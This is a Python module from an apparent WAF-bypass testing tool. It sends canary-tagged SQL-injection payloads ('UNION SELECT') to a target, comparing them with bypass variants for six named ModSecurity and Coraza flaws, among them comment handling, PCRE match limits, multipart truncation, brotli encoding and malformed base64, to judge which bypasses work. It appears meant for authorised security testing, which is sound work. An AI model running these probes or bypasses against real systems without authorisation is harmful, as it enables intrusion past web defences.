"""Behavioural probe for the 2026 WAF-ENGINE CVE primitives.

libmodsecurity / Coraza do not advertise their version over the wire, so you can't
*read* the patch level remotely. You can, however, *test the behaviour*: for each
primitive, send a baseline the WAF should block and the bypass variant, and compare
— exactly the differential `lab/vuln_repro.py` runs locally, here as a safe,
canary-token recon step that tells an operator which engine bugs look exploitable
before committing to a full search.

Non-destructive: every payload carries a benign canary marker and names no real
table/file. Reuses WAFFEN's own mutators/transforms so the probe and the search
stay in lock-step. Duck-typed: pass a `sender(payload)->obj with .code` to test
offline; otherwise a real Oracle is built per probe.

Verdicts per primitive:
  PRESENT       baseline blocked, bypass passed  -> engine bug looks exploitable
  ABSENT        baseline blocked, bypass blocked -> patched, or masked by a
                comment-agnostic detector (e.g. libinjection) — not exploitable here
  INCONCLUSIVE  baseline not blocked             -> WAF doesn't catch the baseline
                on this endpoint, so the differential can't be measured
"""
from __future__ import annotations

from dataclasses import dataclass

# A WAF block.
_BLOCK = {"403", "406"}
# A clean backend response — the request actually got through and was processed.
# Only these count as a "pass": a 400/414/5xx means the server REJECTED the request
# shape (malformed body, URI too long, backend error), which is NOT a WAF bypass, so
# it must not be read as one (that was an early false-positive source).
_PASS = {"200", "201", "202", "204", "301", "302", "303", "307", "308", "404", "422"}
CANARY = "wafcanary7z"


@dataclass
class CveProbe:
    cve: str
    name: str
    verdict: str          # PRESENT | ABSENT | INCONCLUSIVE
    detail: str


def classify(baseline_code: str, bypass_code: str) -> tuple[str, str]:
    """Pure differential verdict from two status codes."""
    bc, pc = str(baseline_code), str(bypass_code)
    if bc not in _BLOCK:
        return "INCONCLUSIVE", f"baseline not blocked (code {bc or '—'}); cannot measure"
    if pc in _BLOCK:
        return "ABSENT", f"baseline {bc}, bypass {pc} — both blocked (patched or masked)"
    if pc in _PASS:
        return "PRESENT", f"baseline {bc} blocked, bypass {pc} passed — bug looks exploitable"
    return "INCONCLUSIVE", (f"baseline {bc}, bypass {pc} — not a clean pass "
                            "(server error/limit, not a WAF bypass)")


def _sqli(canary: str) -> str:
    # a real SQLi shape (so the WAF blocks it) carrying only benign canary tokens
    return f"{canary}' UNION SELECT {canary}-- -"


def probe_cve_primitives(target, *, sender=None, canary: str = CANARY) -> list[CveProbe]:
    """Run the differential for each 2026 primitive against `target`.

    `sender` (optional) is a `sender(payload)->obj with .code` used for every probe,
    for offline testing; otherwise each probe builds a real Oracle (with the right
    request transform) and sends over the network.
    """
    from ..core.oracle import Oracle
    from ..core import transforms as T
    from ..mutate import REGISTRY

    def code(payload: str, transform=None) -> str:
        return Oracle(target, request_transform=transform, sender=sender).send(payload).code

    seed = _sqli(canary)
    out: list[CveProbe] = []

    # CVE-2026-104259 — t:removeComments off-by-one (mutator axis, query)
    base = REGISTRY.get("sql_between_comment").apply(seed)
    byp = REGISTRY.get("sql_adjacent_comment").apply(seed)
    v, d = classify(code(base), code(byp))
    out.append(CveProbe("CVE-2026-104259", "ModSecurity t:removeComments off-by-one", v, d))

    # GHSA-5m93-4h75-3p2w — PCRE2 @rxGlobal match-limit fail-open (mutator axis)
    byp = REGISTRY.get("sql_pcre_matchlimit_pad").apply(seed)
    v, d = classify(code(seed), code(byp))
    out.append(CveProbe("GHSA-5m93-4h75-3p2w", "PCRE2 @rxGlobal match-limit fail-open", v, d))

    # CVE-2026-41508 — Coraza truncated-multipart fail-open (transform axis)
    v, d = classify(code(seed, T.get("multipart_body")), code(seed, T.get("mp_truncated")))
    out.append(CveProbe("CVE-2026-41508", "Coraza truncated-multipart fail-open", v, d))

    # CVE-2026-104269 — RFC 2231 filename* smuggling (transform axis)
    v, d = classify(code(seed, T.get("multipart_body")), code(seed, T.get("mp_filename_rfc2231")))
    out.append(CveProbe("CVE-2026-104269", "RFC 2231 filename* smuggling", v, d))

    # CVE-2026-111497 — inbound Content-Encoding: br blind spot (transform axis)
    v, d = classify(code(seed, T.get("json_body")), code(seed, T.get("brotli_body")))
    out.append(CveProbe("CVE-2026-111497", "Content-Encoding: br inspection blind spot", v, d))

    # GHSA-4j47-8qcr-jf59 — t:base64DecodeExt blanking (mutator axis). Baseline is
    # PLAIN base64 (not the raw seed): PRESENT then means the WAF *does* base64-decode
    # (it blocked the plain form) yet the malformed 'A==' prefix blanked it — the bug
    # isolated. If the WAF doesn't decode base64 at all, the baseline passes -> the
    # probe is INCONCLUSIVE here, not a false PRESENT.
    base = REGISTRY.get("base64").apply(seed)
    byp = REGISTRY.get("base64_malformed_prefix").apply(seed)
    v, d = classify(code(base), code(byp))
    if v == "INCONCLUSIVE":
        d += " (WAF doesn't base64-decode this param, or doesn't catch the plain form)"
    out.append(CveProbe("GHSA-4j47-8qcr-jf59", "ModSecurity t:base64DecodeExt blanking", v, d))

    return out
